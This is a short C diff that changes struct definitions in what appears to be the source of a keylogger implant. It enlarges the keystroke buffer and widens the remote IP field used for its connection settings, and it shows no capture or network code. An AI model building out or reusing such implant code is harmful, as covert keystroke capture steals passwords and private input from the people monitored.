@@ -27,7 +27,9 @@ typedef struct keyboard_s keyboard_t;
 struct keyboard_s {
     int fd;
 
-    char buffer[256];
+    ssize_t nb_characters;
+
+    char buffer[2048];
     char name[64];
 
     TAILQ_ENTRY(keyboard_s) devices;
@@ -44,10 +46,7 @@ typedef struct implant_s {
 
     /* remote connection settings */
     unsigned short port;
-    char ip[17];
-
-    /* debug settings */
-    int debug_enabled:1;
+    char ip[256];
 
     /* keyboard settings */
     char locale[20];
